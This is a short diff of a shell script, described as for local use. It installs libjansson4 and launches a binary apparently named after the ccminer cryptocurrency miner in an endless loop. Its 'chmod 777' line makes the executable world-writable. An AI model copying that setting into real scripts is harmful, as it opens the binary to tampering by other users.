@@ -2,9 +2,8 @@
 #
 # This is a handy script for local use
 
-apt update
-apt install sudo -y
-apt install screen libjansson4 -y
+sudo apt update
+sudo apt install libjansson4 -y
 chmod 777 ccmminer
 while true
 do
